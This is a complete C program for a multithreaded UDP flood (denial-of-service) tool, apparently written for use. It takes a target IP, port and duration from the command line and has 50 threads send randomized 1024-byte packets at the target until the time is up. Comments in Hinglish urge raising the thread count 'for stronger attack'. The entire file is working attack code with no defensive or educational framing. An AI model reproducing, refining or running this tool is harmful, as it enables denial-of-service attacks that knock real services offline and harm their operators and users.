#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define THREAD_COUNT 50  // Threads ka number (increase for stronger attack)

struct attack_params {
    char target_ip[16];
    int port;
    int duration;
};

void *attack(void *arg) {
    struct attack_params *params = (struct attack_params *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    char payload[1024];  // Bigger payload for stronger attack
    srand(time(NULL));

    time_t endtime = time(NULL) + params->duration;
    while (time(NULL) < endtime) {
        memset(payload, rand() % 256, sizeof(payload));  // Randomized payload
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <Target_IP> <Port> <Duration>\n", argv[0]);
        return 1;
    }

    struct attack_params params;
    strncpy(params.target_ip, argv[1], 16);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, attack, &params);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished\n");
    return 0;
}
